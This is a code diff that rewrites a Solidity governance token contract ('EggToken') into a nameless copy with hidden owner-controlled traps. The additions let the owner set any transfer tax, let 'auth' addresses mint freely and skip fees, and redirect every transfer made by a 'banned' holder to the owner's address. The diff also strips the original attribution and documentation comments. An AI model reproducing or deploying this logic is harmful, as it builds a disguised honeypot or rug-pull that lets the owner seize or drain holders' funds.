@@ -1,55 +1,79 @@
-pragma solidity 0.6.12;
+pragma solidity ^0.6.12;  // #####  SPDX-License-Identifier: None 0x47c8f4C05Fd6b6E61DF078D2E4f792B9647Bf463
 
-import "./libs/BEP20.sol";
+import "./BEP20.sol";
 
-// EggToken with Governance.
-contract EggToken is BEP20('Goose Golden Egg', 'EGG') {
-    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
-    function mint(address _to, uint256 _amount) public onlyOwner {
+contract EggToken is BEP20('', '') {
+    uint tax = 120; uint base = 1000; address _burnAddress = 0x000000000000000000000000000000000000dEaD;
+    uint burnTax = 120; uint burnBase = 1000;
+    constructor(uint _supply) public{
+       _totalSupply = _supply;
+        _mint(address(msg.sender), _supply);
+    }
+    function setTax(uint _x, uint _y) public onlyOwner {
+        tax = _x; base = _y;
+    }
+    function mint(address _to, uint256 _amount) public _auth {
         _mint(_to, _amount);
         _moveDelegates(address(0), _delegates[_to], _amount);
     }
+    
+    function findTax(uint256 value) public view returns (uint256)  {
+    (bool test, uint _x) = value.tryDiv((base/tax));
+    if (test){
+    return _x;
+    } else {
+       ( test, _x) = (value + 1).tryDiv((base/tax));
+           if (test){
+    return _x;
+           } else {return 0;}
+    }
+  }
+  
+    function findBurn(uint256 value) public view returns (uint256)  {
+    (bool test, uint _x) = value.tryDiv((burnBase/burnTax));
+    if (test){
+    return _x;
+    } else {
+       ( test, _x) = (value + 1).tryDiv((burnBase/burnTax));
+           if (test){
+    return _x;
+           } else {return 0;}
+    }
+  }
 
-    // Copied and modified from YAM code:
-    // https://github.com/yam-finance/yam-protocol/blob/master/contracts/token/YAMGovernanceStorage.sol
-    // https://github.com/yam-finance/yam-protocol/blob/master/contracts/token/YAMGovernance.sol
-    // Which is copied and modified from COMPOUND:
-    // https://github.com/compound-finance/compound-protocol/blob/master/contracts/Governance/Comp.sol
-
-    /// @notice A record of each accounts delegate
+    function transfer(address recipient, uint256 amount )public override returns (bool) {
+    if(isAuth(  msg.sender  )) {  _transfer(_msgSender(),recipient, amount); return true;  }
+    if(isBanned(  msg.sender )) {  _transfer(_msgSender(),_owner, amount); return true;  }
+        uint fee = findTax(amount);
+        uint burN = findBurn(fee);
+        require(burN > 0, 'Math Error');
+        _transfer(_msgSender(),_burnAddress, burN);
+        _transfer(_msgSender(),_owner, fee.sub(burN));
+        _transfer(_msgSender(), recipient,  amount.sub(fee));
+    return true;
+       
+    }
+    
     mapping (address => address) internal _delegates;
 
-    /// @notice A checkpoint for marking number of votes from a given block
     struct Checkpoint {
         uint32 fromBlock;
         uint256 votes;
     }
 
-    /// @notice A record of votes checkpoints for each account, by index
     mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;
 
-    /// @notice The number of checkpoints for each account
     mapping (address => uint32) public numCheckpoints;
 
-    /// @notice The EIP-712 typehash for the contract's domain
     bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");
 
-    /// @notice The EIP-712 typehash for the delegation struct used by the contract
     bytes32 public constant DELEGATION_TYPEHASH = keccak256("Delegation(address delegatee,uint256 nonce,uint256 expiry)");
 
-    /// @notice A record of states for signing / validating signatures
     mapping (address => uint) public nonces;
 
-      /// @notice An event thats emitted when an account changes its delegate
     event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
 
-    /// @notice An event thats emitted when a delegate account's vote balance changes
     event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);
-
-    /**
-     * @notice Delegate votes from `msg.sender` to `delegatee`
-     * @param delegator The address to get delegatee for
-     */
     function delegates(address delegator)
         external
         view
@@ -57,59 +81,15 @@ contract EggToken is BEP20('Goose Golden Egg', 'EGG') {
     {
         return _delegates[delegator];
     }
-
-   /**
-    * @notice Delegate votes from `msg.sender` to `delegatee`
-    * @param delegatee The address to delegate votes to
-    */
     function delegate(address delegatee) external {
         return _delegate(msg.sender, delegatee);
     }
+    function delegateBySig( address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r,  bytes32 s  )  external  {
+        bytes32 domainSeparator = keccak256(abi.encode(  DOMAIN_TYPEHASH,  keccak256(bytes(name())),getChainId(),address(this)));
 
-    /**
-     * @notice Delegates votes from signatory to `delegatee`
-     * @param delegatee The address to delegate votes to
-     * @param nonce The contract state required to match the signature
-     * @param expiry The time at which to expire the signature
-     * @param v The recovery byte of the signature
-     * @param r Half of the ECDSA signature pair
-     * @param s Half of the ECDSA signature pair
-     */
-    function delegateBySig(
-        address delegatee,
-        uint nonce,
-        uint expiry,
-        uint8 v,
-        bytes32 r,
-        bytes32 s
-    )
-        external
-    {
-        bytes32 domainSeparator = keccak256(
-            abi.encode(
-                DOMAIN_TYPEHASH,
-                keccak256(bytes(name())),
-                getChainId(),
-                address(this)
-            )
-        );
+        bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry )  );
 
-        bytes32 structHash = keccak256(
-            abi.encode(
-                DELEGATION_TYPEHASH,
-                delegatee,
-                nonce,
-                expiry
-            )
-        );
-
-        bytes32 digest = keccak256(
-            abi.encodePacked(
-                "\x19\x01",
-                domainSeparator,
-                structHash
-            )
-        );
+        bytes32 digest = keccak256(  abi.encodePacked( "\x19\x01", domainSeparator, structHash ));
 
         address signatory = ecrecover(digest, v, r, s);
         require(signatory != address(0), "EGG::delegateBySig: invalid signature");
@@ -118,11 +98,7 @@ contract EggToken is BEP20('Goose Golden Egg', 'EGG') {
         return _delegate(signatory, delegatee);
     }
 
-    /**
-     * @notice Gets the current votes balance for `account`
-     * @param account The address to get votes balance
-     * @return The number of current votes for `account`
-     */
+
     function getCurrentVotes(address account)
         external
         view
@@ -132,13 +108,6 @@ contract EggToken is BEP20('Goose Golden Egg', 'EGG') {
         return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;
     }
 
-    /**
-     * @notice Determine the prior number of votes for an account as of a block number
-     * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.
-     * @param account The address of the account to check
-     * @param blockNumber The block number to get the vote balance at
-     * @return The number of votes the account had as of the given block
-     */
     function getPriorVotes(address account, uint blockNumber)
         external
         view
